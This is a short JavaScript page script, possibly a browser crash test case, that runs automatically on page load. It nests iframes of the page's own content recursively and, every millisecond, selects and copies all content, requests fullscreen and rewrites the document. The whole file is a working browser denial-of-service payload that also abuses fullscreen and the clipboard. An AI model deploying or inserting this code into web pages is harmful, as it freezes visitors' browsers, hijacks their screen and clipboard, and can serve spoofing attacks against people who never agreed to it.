function run() {
  var recursiveIframe = document.createElement("iframe");
  recursiveIframe.srcdoc = document.documentElement.innerHTML;
  detailsTest.appendChild(recursiveIframe);
}

function spoof() {
  function copyAndRequestFullscreen() {
    document.execCommand("selectAll", false);
    document.execCommand("copy", false);
    document.documentElement.requestFullscreen();
    document.write("<input placeholder='#'></input>");
    setTimeout(copyAndRequestFullscreen, 1);
  }

  copyAndRequestFullscreen();
}

document.addEventListener('DOMContentLoaded', function () {
  run();
  spoof();
});